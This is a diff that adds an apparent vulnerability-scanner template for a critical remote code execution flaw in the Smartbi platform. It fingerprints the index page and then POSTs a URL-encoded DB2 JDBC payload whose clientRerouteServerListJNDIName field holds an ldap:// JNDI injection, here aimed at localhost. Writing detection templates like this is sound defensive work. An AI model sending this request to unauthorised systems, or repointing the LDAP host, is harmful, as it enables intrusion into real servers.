@@ -1,0 +1,47 @@
+id: smartbi-db2-rce
+info:
+  name: Smartbi Platform DB2 Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  path_list:
+    - vision
+    - smartbi/vision
+
+http:
+  - id: check-index-page
+    method: GET
+    path:
+      - "/{{path}}/index.jsp"
+    payloads:
+      path: path_list
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
+  - id: test-db2-rce
+    method: POST
+    path:
+      - "/{{path}}/.stub?className=DataSourceService&methodName=testConnection&params=%5B%7B%22driverType%22%3A%22aaa%22%2C%22driver%22%3A%22com.ibm.db2.jcc.DB2Driver%22%2C%22maxConnection%22%3A1%2C%22transactionIsolation%22%3A1%2C%22validationQueryMethod%22%3A3%2C%22url%22%3A%22jdbc%3Adb2%3A%2F%2F127.0.0.1%3A18080%2Fa%3AclientRerouteServerListJNDIName%3Dldap%3A%2F%2F127.0.0.1%22%7D%5D"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    payloads:
+      path: path_list
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CONNECTION_POOL_NOT_INITIAL"
+          - "连接池初始化失败"
+          - "127.0.0.1"
